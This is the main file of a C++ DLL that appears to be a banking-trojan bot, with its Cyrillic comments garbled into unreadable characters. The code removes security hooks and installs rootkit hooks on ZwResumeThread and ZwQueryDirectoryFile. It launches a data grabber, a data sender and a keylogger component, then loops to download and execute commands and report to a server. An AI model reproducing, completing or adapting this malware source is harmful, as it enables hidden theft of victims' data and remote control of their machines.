// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"


#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "md5.h"

#include "DbgRpt.h"

//#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  ������� ���������� �����
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //��� ����������

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");


	UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// ������������ ���������� �������� �����
	InitializeTaskManager(NULL, true);

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	// 402_pl ������ ����� ��������� ������ (�� ���������� � ������ ��������)
	DebugReportStepByName("402_pl");

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}




	// ��������� ����� �������� ������
	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "�������� ���������� ������");
	while (true)
	{
		// 403_pl ���� ��������� ������
		DebugReportStepByName("403_pl");
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "������������" �������������� ����������� ���� � ��� �������
		// �������� ��������� ���������� ������ ���� ������ ����� ���������
		// �������
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "���������� ���������� � �������");
			FirstSended = SendFirstInfo();
		}


		// ���������������� ���������� ������
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}



DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "��������� ���. ������� [%s]", GetPrefix());

	UnhookDlls();

	
	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	// 401_pl ������ BotPlug
	DebugReportStepByName("401_pl");

		
	DLLDBG("====>Bot DLL", "�������� Loader");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "�������� ������");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}


extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
{
	StartThread(ExplorerMain, NULL);
}

BOOL WINAPI StartFromFakeDll()
{
	DLLDBG("StartFromFakeDll", "Started and finished.");
	return FALSE;
}
